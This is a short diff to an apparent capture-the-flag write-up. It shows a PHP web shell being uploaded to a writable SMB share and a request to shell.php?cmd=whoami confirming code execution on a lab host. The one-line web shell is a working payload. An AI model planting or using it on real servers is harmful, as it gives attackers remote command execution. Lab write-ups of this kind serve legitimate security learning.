@@ -54,8 +54,11 @@ We have write access over the `new-site` share. Visiting the share with `smbclie
 
 <img src="images/iis.png">
 
-I'll create a php script containing
+I'll create `shell.php` containing
 ```
 <?php system($_REQUEST['cmd']); ?>
 ```
-and upload it to the share.
+and upload it to the share. Visiting the URL `http://10.10.10.97:8808/shell.php?cmd=whoami` shows we have code execution on the server.
+
+<img src="images/rce.png">
+
